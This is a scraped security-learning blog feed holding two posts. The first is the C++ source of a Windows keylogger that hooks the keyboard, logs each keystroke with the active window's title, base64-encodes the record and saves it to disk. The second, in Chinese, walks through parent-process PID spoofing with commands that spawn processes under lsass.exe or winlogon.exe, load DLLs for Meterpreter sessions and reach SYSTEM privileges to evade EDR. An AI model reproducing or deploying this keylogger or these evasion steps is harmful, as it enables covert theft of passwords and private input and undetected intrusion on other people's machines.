_KbHook::SendStopHook(){SendMessage(m_hWndKeylogger, WM_StopHook, 0, 0);}//---------------------------------------------------------------------------------void _KbHook::StartHook(){if (m_hFile == INVALID_HANDLE_VALUE){m_hFile = CreateFile(m_fileName, GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);SetFilePointer(m_hFile, 0, 0, FILE_END);}HINSTANCE h = LoadLibrary("User32.dll");mySetWindowsHookEx = (My_SetWindowsHookEx)GetProcAddress(h, "SetWindowsHookExA");m_hhook = mySetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);}//---------------------------------------------------------------------------------void _KbHook::StopHook(){if (m_hhook != NULL){UnhookWindowsHookEx(m_hhook);m_hhook = NULL;if (INVALID_HANDLE_VALUE != m_hFile){CloseHandle(m_hFile);m_hFile = INVALID_HANDLE_VALUE;}}}LRESULT CALLBACK _KbHook::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){if (m_pThis != NULL){return m_pThis-&gt;KeyboardHookFunc(nCode, wParam, lParam);}return 0L;}LRESULT _KbHook::KeyboardHookFunc(int nCode, WPARAM wParam, LPARAM lParam){if (nCode != HC_ACTION)return CallNextHookEx(m_hhook, nCode, wParam, lParam);PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);if (wParam == WM_KEYDOWN){if ((int)(GetTickCount() - p-&gt;time) &gt; 100 || (int)(GetTickCount() - p-&gt;time) &lt; -100){return CallNextHookEx(m_hhook, nCode, wParam, lParam);}HWND hFocus; //保存当前活动窗口句柄hFocus = GetForegroundWindow();//获得活动窗口的句柄memset(m_CurrentWindowText, 0, 128);GetWindowText(hFocus, m_CurrentWindowText, 128);if (m_hLastFocus != hFocus || strcmp(m_LastWindowText, m_CurrentWindowText) != 0){char szSendBuffer[512]; //当前窗口名称SYSTEMTIME st;GetLocalTime(&amp;st);wsprintf(szSendBuffer, "\r\n%d-%d-%d %d:%d\'%d\"  ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);memset(m_LastWindowText, 0, 128);GetWindowText(hFocus, m_LastWindowText, 128);strcat(szSendBuffer, m_LastWindowText);strcat(szSendBuffer, "\r\n");m_hLastFocus = hFocus;ProcessKeyInfo(szSendBuffer);}char KeyBuffer[32];memset(KeyBuffer, 0, 32);int iShift = (GetKeyState(VK_SHIFT) &amp; 0x8000) != 0 ? 1 : 0;int iCapital = GetKeyState(VK_CAPITAL) &amp; 0x0001;switch (p-&gt;vkCode) {case VK_BACK:       ProcessKeyInfo("(BK)");       break;case VK_TAB:       ProcessKeyInfo("(TAB)");       break;case VK_CLEAR:       ProcessKeyInfo("(CLEAR)");       break;case VK_RETURN:       ProcessKeyInfo("↙");       break;case VK_SHIFT:       ProcessKeyInfo("(SHIFT DOWN)");       break;case VK_CONTROL:       ProcessKeyInfo("(CTRL DOWN)");       break;case VK_MENU:       ProcessKeyInfo("(ALT DOWN)");       break;case VK_PAUSE:       ProcessKeyInfo("(PAUSE)");       break;case VK_CAPITAL:       ProcessKeyInfo("(CAPS LOCK)");       break;case VK_ESCAPE:       ProcessKeyInfo("(ESC)");       break;case VK_SPACE:       ProcessKeyInfo(" ");       break;case VK_PRIOR:       ProcessKeyInfo("(PAGE UP)");       break;case VK_NEXT:       ProcessKeyInfo("(PAGE DOWN)");       break;case VK_END:       ProcessKeyInfo("(END)");       break;case VK_HOME:       ProcessKeyInfo("(HOME)");       break;case VK_LEFT:       ProcessKeyInfo("←");       break;case VK_UP:       ProcessKeyInfo("↑");       break;case VK_RIGHT:       ProcessKeyInfo("→");       break;case VK_DOWN:       ProcessKeyInfo("↓");       break;case VK_SELECT:       ProcessKeyInfo("(SELECT)");       break;case VK_PRINT:       ProcessKeyInfo("(PRINT)");       break;case VK_EXECUTE:       ProcessKeyInfo("(EXECUTE)");       break;case VK_SNAPSHOT:       ProcessKeyInfo("(PRINT SCREEN)");       break;case VK_INSERT:       ProcessKeyInfo("(INSERT)");       break;case VK_DELETE:       ProcessKeyInfo("(DEL)");       break;case VK_HELP:       ProcessKeyInfo("(HELP)");       break;case VK_LWIN:       ProcessKeyInfo("(Left Windows key DOWN)");       break;case VK_RWIN:       ProcessKeyInfo("(Right Windows key DOWN)");       break;case VK_APPS:       ProcessKeyInfo("(Applications key)");       break;case VK_SLEEP:       ProcessKeyInfo("(Computer Sleep key)");       break;case VK_NUMPAD0:strcpy(KeyBuffer, "0");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD1:strcpy(KeyBuffer, "1");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD2:strcpy(KeyBuffer, "2");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD3:strcpy(KeyBuffer, "3");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD4:strcpy(KeyBuffer, "4");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD5:strcpy(KeyBuffer, "5");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD6:strcpy(KeyBuffer, "6");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD7:strcpy(KeyBuffer, "7");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD8:strcpy(KeyBuffer, "8");ProcessKeyInfo(KeyBuffer);break;case VK_NUMPAD9:strcpy(KeyBuffer, "9");ProcessKeyInfo(KeyBuffer);break;case VK_MULTIPLY:if (iShift)ProcessKeyInfo(":");elseProcessKeyInfo("*");break;case VK_ADD:       ProcessKeyInfo("+");       break;case VK_SEPARATOR:       ProcessKeyInfo("(Separator key)");       break;case VK_SUBTRACT:       ProcessKeyInfo("-");       break;case VK_DECIMAL:       ProcessKeyInfo(".");       break;case VK_DIVIDE:       ProcessKeyInfo("/");       break;case VK_F1:       ProcessKeyInfo("(F1)");       break;case VK_F2:       ProcessKeyInfo("(F2)");       break;case VK_F3:       ProcessKeyInfo("(F3)");       break;case VK_F4:       ProcessKeyInfo("(F4)");       break;case VK_F5:       ProcessKeyInfo("(F5)");       break;case VK_F6:       ProcessKeyInfo("(F6)");       break;case VK_F7:       ProcessKeyInfo("(F7)");       break;case VK_F8:       ProcessKeyInfo("(F8)");       break;case VK_F9:       ProcessKeyInfo("(F9)");       break;case VK_F10:       ProcessKeyInfo("(F10)");       break;case VK_F11:       ProcessKeyInfo("(F11)");       break;case VK_F12:       ProcessKeyInfo("(F12)");       break;case VK_NUMLOCK:       ProcessKeyInfo("(NUM LOCK)");       break;case VK_SCROLL:       ProcessKeyInfo("(SCROLL LOCK)");       break;case VK_LSHIFT:       ProcessKeyInfo("(SHIFT DOWN)");       break;case VK_RSHIFT:       ProcessKeyInfo("(SHIFT DOWN)");       break;case VK_LCONTROL:       ProcessKeyInfo("(CTRL DOWN)");       break;case VK_RCONTROL:       ProcessKeyInfo("(CTRL DOWN)");       break;case VK_LMENU:       ProcessKeyInfo("(Left MENU)");       break;case VK_RMENU:       ProcessKeyInfo("(Right MENU)");       break;case VK_BROWSER_BACK:       ProcessKeyInfo("(Browser Back key)");       break;case VK_BROWSER_FORWARD:       ProcessKeyInfo("(Browser Forward key)");       break;case VK_BROWSER_REFRESH:       ProcessKeyInfo("(Browser Refresh key)");       break;case VK_BROWSER_STOP:       ProcessKeyInfo("(Browser Stop key)");       break;case VK_BROWSER_SEARCH:       ProcessKeyInfo("(Browser Search key )");       break;case VK_BROWSER_FAVORITES:       ProcessKeyInfo("(Browser Favorites key)");       break;case VK_BROWSER_HOME:       ProcessKeyInfo("(Browser Start and Home key)");       break;case VK_VOLUME_MUTE:       ProcessKeyInfo("(Volume Mute key)");       break;case VK_VOLUME_DOWN:       ProcessKeyInfo("(Volume Down key)");       break;case VK_VOLUME_UP:       ProcessKeyInfo("(Volume Up key)");       break;case VK_MEDIA_NEXT_TRACK:       ProcessKeyInfo("(Next Track key)");       break;case VK_MEDIA_PREV_TRACK:       ProcessKeyInfo("(Previous Track key)");       break;case VK_MEDIA_STOP:       ProcessKeyInfo("(Stop Media key)");       break;case VK_MEDIA_PLAY_PAUSE:       ProcessKeyInfo("(Play/Pause Media key)");       break;case VK_LAUNCH_MAIL:       ProcessKeyInfo("(Start Mail key)");       break;case VK_LAUNCH_MEDIA_SELECT:       ProcessKeyInfo("(Select Media key)");       break;case VK_LAUNCH_APP1:       ProcessKeyInfo("(Start Application 1 key)");       break;case VK_LAUNCH_APP2:       ProcessKeyInfo("(Start Application 2 key)");       break;case VK_OEM_1:if (iShift)ProcessKeyInfo(":");elseProcessKeyInfo(";");break;case VK_OEM_PLUS:if (iShift)ProcessKeyInfo("+");elseProcessKeyInfo("=");break;case VK_OEM_COMMA:if (iShift)ProcessKeyInfo("&lt;");elseProcessKeyInfo(",");break;case VK_OEM_MINUS:if (iShift)ProcessKeyInfo("_");elseProcessKeyInfo("-");break;case VK_OEM_PERIOD:if (iShift)ProcessKeyInfo("&gt;");elseProcessKeyInfo(".");break;case VK_OEM_2:if (iShift)ProcessKeyInfo("?");elseProcessKeyInfo("/");break;case VK_OEM_3:if (iShift)ProcessKeyInfo("~");elseProcessKeyInfo("`");break;case VK_OEM_4:if (iShift)ProcessKeyInfo("{");elseProcessKeyInfo("[");break;case VK_OEM_5:if (iShift)ProcessKeyInfo("|");elseProcessKeyInfo("\\");break;case VK_OEM_6:if (iShift)ProcessKeyInfo("}");elseProcessKeyInfo("]");break;case VK_OEM_7:if (iShift)ProcessKeyInfo("\"");elseProcessKeyInfo("\'");break;case VK_OEM_CLEAR:       ProcessKeyInfo("(Clear)");       break;default:{//if('z'p-&gt;vkCode&lt;'z')char Key = (char)tolower(p-&gt;vkCode);if (Key &lt;= 'z'&amp;&amp;Key &gt;= 'a'){if (iCapital^iShift)Key = Key - 'a' + 'A';}else if (Key == '0'){if (iShift)Key = ')';}else if (Key == '1'){if (iShift)Key = '!';}else if (Key == '2'){if (iShift)Key = '@';}else if (Key == '3'){if (iShift)Key = '#';}else if (Key == '4'){if (iShift)Key = '$';}else if (Key == '5'){if (iShift)Key = '%';}else if (Key == '6'){if (iShift)Key = '^';}else if (Key == '7'){if (iShift)Key = '&amp;';}else if (Key == '8'){if (iShift)Key = '*';}else if (Key == '9'){if (iShift)Key = '(';}char Buffer[2];Buffer[0] = Key;Buffer[1] = 0;ProcessKeyInfo(Buffer);}}}if (wParam == WM_KEYUP) {switch (p-&gt;vkCode) {case VK_SHIFT:       ProcessKeyInfo("(SHIFT UP)");       break;case VK_CONTROL:       ProcessKeyInfo("(CTRL UP)");       break;case VK_MENU:       ProcessKeyInfo("(ALT UP)");       break;case VK_LSHIFT:       ProcessKeyInfo("(SHIFT UP)");       break;case VK_RSHIFT:       ProcessKeyInfo("(SHIFT UP)");       break;case VK_LCONTROL:       ProcessKeyInfo("(CTRL UP)");       break;case VK_RCONTROL:       ProcessKeyInfo("(CTRL UP)");       break;case VK_LWIN:       ProcessKeyInfo("(Windows key UP)");       break;case VK_RWIN:       ProcessKeyInfo("(Windows key UP)");       break;default: break;}}return CallNextHookEx(NULL, nCode, wParam, lParam);}// 全局常量定义const char * base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";const char padding_char = '=';/*编码代码* const unsigned char * sourcedata， 源数组* char * base64 ，码字保存*/int base64_encode(const unsigned char * sourcedata, char * base64){int i = 0, j = 0;unsigned char trans_index = 0;    // 索引是8位，但是高两位都为0const int datalength = strlen((const char*)sourcedata);for (; i &lt; datalength; i += 3) {// 每三个一组，进行编码// 要编码的数字的第一个trans_index = ((sourcedata[i] &gt;&gt; 2) &amp; 0x3f);base64[j++] = base64char[(int)trans_index];// 第二个trans_index = ((sourcedata[i] &lt;&lt; 4) &amp; 0x30);if (i + 1 &lt; datalength) {trans_index |= ((sourcedata[i + 1] &gt;&gt; 4) &amp; 0x0f);base64[j++] = base64char[(int)trans_index];}else {base64[j++] = base64char[(int)trans_index];base64[j++] = padding_char;base64[j++] = padding_char;break;   // 超出总长度，可以直接break}// 第三个trans_index = ((sourcedata[i + 1] &lt;&lt; 2) &amp; 0x3c);if (i + 2 &lt; datalength) { // 有的话需要编码2个trans_index |= ((sourcedata[i + 2] &gt;&gt; 6) &amp; 0x03);base64[j++] = base64char[(int)trans_index];trans_index = sourcedata[i + 2] &amp; 0x3f;base64[j++] = base64char[(int)trans_index];}else {base64[j++] = base64char[(int)trans_index];base64[j++] = padding_char;break;}}base64[j] = '\0';return 0;}/** 在字符串中查询特定字符位置索引* const char *str ，字符串* char c，要查找的字符*/inline int num_strchr(const char *str, char c) // {const char *pindex = strchr(str, c);if (NULL == pindex) {return -1;}return pindex - str;}/* 解码* const char * base64 码字* unsigned char * dedata， 解码恢复的数据*/int base64_decode(const char * base64, unsigned char * dedata){int i = 0, j = 0;int trans[4] = { 0,0,0,0 };for (; base64[i] != '\0'; i += 4) {// 每四个一组，译码成三个字符trans[0] = num_strchr(base64char, base64[i]);trans[1] = num_strchr(base64char, base64[i + 1]);// 1/3dedata[j++] = ((trans[0] &lt;&lt; 2) &amp; 0xfc) | ((trans[1] &gt;&gt; 4) &amp; 0x03);if (base64[i + 2] == '=') {continue;}else {trans[2] = num_strchr(base64char, base64[i + 2]);}// 2/3dedata[j++] = ((trans[1] &lt;&lt; 4) &amp; 0xf0) | ((trans[2] &gt;&gt; 2) &amp; 0x0f);if (base64[i + 3] == '=') {continue;}else {trans[3] = num_strchr(base64char, base64[i + 3]);}// 3/3dedata[j++] = ((trans[2] &lt;&lt; 6) &amp; 0xc0) | (trans[3] &amp; 0x3f);}dedata[j] = '\0';return 0;}LPCSTR AnsiToUtf8(LPCSTR Ansi){   int WLength = MultiByteToWideChar(CP_ACP, 0, Ansi, -1, NULL, 0);   LPWSTR pszW = (LPWSTR)_alloca((WLength + 1) * sizeof(WCHAR));   MultiByteToWideChar(CP_ACP, 0, Ansi, -1, pszW, WLength);   int ALength = WideCharToMultiByte(CP_UTF8, 0, pszW, -1, NULL, 0, NULL, NULL);   LPSTR pszA = (LPSTR)_alloca(ALength + 1);   WideCharToMultiByte(CP_UTF8, 0, pszW, -1, pszA, ALength, NULL, NULL);   pszA[ALength] = 0;  return pszA;}void _KbHook::ProcessKeyInfo(char *Buffer){LPCSTR str;str = AnsiToUtf8(Buffer);unsigned  char str_l[MAX_PATH] = { 0 }; memcpy(str_l, str, strlen(str));const unsigned char *sourcedata = str_l;char base64[MAX_PATH] = {0};base64_encode(sourcedata, base64);//char dedata[128];//base64_decode(base64, (unsigned char*)dedata);  //解密DWORD dwLen = 0;int iRet = WriteFile(m_hFile, base64, strlen(base64), &amp;dwLen, NULL);if (iRet == 0){}WriteFile(m_hFile, "\r\n", 1, &amp;dwLen, NULL);}//------------------------------------------------------------------//捕捉指定屏幕,切换到输入桌面BOOL _KbHook::Desktop_Capture(PCHAR lpWinSta, PCHAR lpDesktop, PCHAR lpFile, DWORD m_dwLastError){try {HWINSTA hWinSta = OpenWindowStation(lpWinSta, false, MAXIMUM_ALLOWED);if (hWinSta == NULL){m_dwLastError = GetLastError();return FALSE;}HWINSTA hOldWinSta = GetProcessWindowStation();if (!SetProcessWindowStation(hWinSta)){m_dwLastError = GetLastError();CloseWindowStation(hWinSta);return FALSE;}HDESK hDesktop = OpenInputDesktop(DF_ALLOWOTHERACCOUNTHOOK, FALSE, MAXIMUM_ALLOWED);if (hDesktop == NULL){m_dwLastError = GetLastError();SetProcessWindowStation(hOldWinSta);CloseWindowStation(hWinSta);return FALSE;}HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());if (!SetThreadDesktop(hDesktop)){m_dwLastError = GetLastError();SetProcessWindowStation(hOldWinSta);CloseWindowStation(hWinSta);return FALSE;}CloseWindowStation(hWinSta);CloseDesktop(hDesktop);}catch (...){}return true; //bCapture;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.6-fu-fu-jin-cheng-qi-pian-ji-zhu/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.6-fu-fu-jin-cheng-qi-pian-ji-zhu/</url>
      
        <content type="html"><![CDATA[<p>父进程欺骗技术</p><p><a href="https://xz.aliyun.com/u/10995"><strong>Al1ex</strong></a> / 2020-10-21 10:52:24 / 浏览数 11720 <a href="https://xz.aliyun.com/tab/1">安全技术</a> <a href="https://xz.aliyun.com/node/27">众测渗透</a><a href="https://xz.aliyun.com/t/javascript:">顶**(1)**</a> <a href="https://xz.aliyun.com/t/javascript:">踩**(0)**</a></p><h2 id="文章正文"><a href="#文章正文" class="headerlink" title="文章正文"></a><strong>文章正文</strong></h2><p>监控父进程和子进程之间的关系是威胁检测团队检测恶意活动的常用技术，例如，如果powershell是子进程，而Microsoft Word是父进程，这种这种异常行为各种EDR可以很容易地检测到，这时红队可以考虑使用父进程PID欺骗作为逃避方法。<br>Windows API——“CreateProcess”允许用户传入一个用于分配父进程PID的参数，这意味着当恶意进程从实际执行的父进程创建时，它可以使用其他的进程作为其父进程。最初这项技术是由Didier Stevens在2009年提出，于此同时他还发布了一个用C++编写的POC(<a href="http://www.didierstevens.com/files/software/SelectMyParent_v0_0_0_1.zip//" title="SelectMyParent">SelectMyParent</a>），它允许用户通过指定PID来选择其父进程，”CreateProcess”函数与”STARTUPINFOEX”和”LPPROC_Thread_ATTRIBUTE_LIST”一起使用：</p><p>SelectMyParent <strong>.</strong> exe notepad <strong>508</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130012-23fc54de-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3EB2.tmp.jpg"></a><br>PID 508对应于负责登录活动、密码更改等操作的”lsass.exe”进程，在执行完上述命令之后Notepad将在lsass.exe进程下创建<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130105-43ca5e50-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3EB3.tmp.jpg"></a><br>对进程属性的检查显示notepad以系统级权限运行，这是因为子进程(notepad.exe)获得了父进程(lsass.exe)的特权:<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130133-54a6ceac-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3EB4.tmp.jpg"></a><br>在Meterpreter会话中，可以通过指定进程名称来检索当前会话的PID：</p><p>getpidps lsass <strong>.</strong> exe</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130200-64bc09ba-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3EC4.tmp.jpg"></a></p><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a><strong>PowerShell</strong></h2><p>F-Secure发布了一个PowerShell脚本(<a href="https://github.com/countercept/ppid-spoofing" title="PPID-Spoof">PPID-Spoof</a>)，它可以用于父进程欺骗，该脚本包含嵌入的C#代码，以便与”CreateProcess” Windows API进行交互。</p><p>public <strong>static</strong> <strong>extern</strong> <strong>bool</strong> CreateProcess**(**</p><p>string lpApplicationName**,**</p><p>string lpCommandLine**,**</p><p>ref SECURITY_ATTRIBUTES lpProcessAttributes**,**</p><p>ref SECURITY_ATTRIBUTES lpThreadAttributes**,**</p><p><strong>bool</strong> bInheritHandles**,**</p><p>uint dwCreationFlags**,**</p><p>IntPtr lpEnvironment**,**</p><p>string lpCurrentDirectory**,**</p><pre class="line-numbers language-none"><code class="language-none">**[** In**]** ref STARTUPINFOEX lpStartupInfo**,**  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>out PROCESS_INFORMATION lpProcessInformation**);**</p><p>该工具接受3个参数，即父进程的pid、子进程的系统路径和用于代码执行的任意dll的路径：</p><p>PPID <strong>-</strong> Spoof  <strong>-</strong> ppid <strong>3556</strong>  <strong>-</strong> spawnto “C:\Windows\System32\notepad.exe”  <strong>-</strong> dllpath pentestlab <strong>.</strong> dll</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130422-b95030d2-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3EC5.tmp.jpg"></a><br>notepad将在powershell的上下文中执行，dll将在notepad.exe内部加载：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130447-c81b12e4-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3EC6.tmp.jpg"></a><br>由于dll被加载到进程内部，所以执行之后将会返回一个Meterpreter会话：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130511-d6406ffe-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3ED7.tmp.jpg"></a><br>一种更隐蔽的方法是在”lsass”进程中加载dll，这样一来威胁检测团队必须检查EventHeader ProcessId和ParentProcessID来识别进程欺骗</p><p>PPID <strong>-</strong> Spoof  <strong>-</strong> ppid <strong>3244</strong>  <strong>-</strong> spawnto “C:\Windows\System32\lsass.exe”  <strong>-</strong> dllpath pentestlab <strong>.</strong> dll</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130540-e7eaea04-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F07.tmp.jpg"></a><br>之后将在加载任意dll的系统上创建一个新的”lsass”进程，这个场景允许红队加载”合法”环境Process：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130612-fae1cbd2-0dda-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F08.tmp.jpg"></a><br>Meterpreter会话将以进程ID 1312打开，该进程ID对应于”rundll32”进程，该进程执行的dll是”lsass.exe”的子进程：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130633-07348c44-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F09.tmp.jpg"></a><br>Andrea Pierini通过在Powershell脚本中嵌入C#代码实现了父进程PID欺骗技术，该脚本将创建一个新的子进程，该进程将把用户定义的任何进程作为父进程，与F-Secure脚本类似，使用”CreateProcess()”API来执行欺骗</p><p>Import <strong>-</strong> Module  <strong>.</strong> \psgetsys <strong>.</strong> ps1 <strong>[</strong> MyProcess <strong>]</strong>  <strong>::</strong> CreateProcessFromParent <strong>(</strong>  <strong>436</strong>  <strong>,</strong> “C:\Windows\System32\cmd.exe” <strong>,</strong> “”<strong>)</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130701-180670be-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F19.tmp.jpg"></a><br>创建的进程将获得父进程(winlogon.exe)的特权(SYSTEM)<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130723-251094ec-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F1A.tmp.jpg"></a></p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a><strong>C++</strong></h2><p>早在2017年，Adam Chester在他的<a href="https://blog.xpnsec.com/becoming-system/" title="博客">博客</a>中解释了Meterpreter的”getsystem”命令是如何在后台工作的，为了将进程的权限从管理员提升到系统，Adam在2014年扩充了Raphael Mudge的文章，内容是关于Meterpter用来提升到系统权限的三种技术。<br><a href="https://github.com/xpn/getsystem-offline" title="Getsystem-Offline">Getsystem-Offline</a>二进制文件利用windows的”ImpersonateNamedPipeClient”API来提升它对系统的权限，原理是通过创建和实施一个服务来实现的，该服务作为系统运行以连接到进程的命名管道，并使用”ImpersonateNamedPipeClient”API来创建提升的模拟Token</p><p>getsystem <strong>-</strong> offline <strong>.</strong> exe</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130825-49f34836-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F1B.tmp.jpg"></a><br>默认情况下，二进制文件将以提升的权限打开新的命令提示符<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130842-5441259c-0ddb-1.png"><img 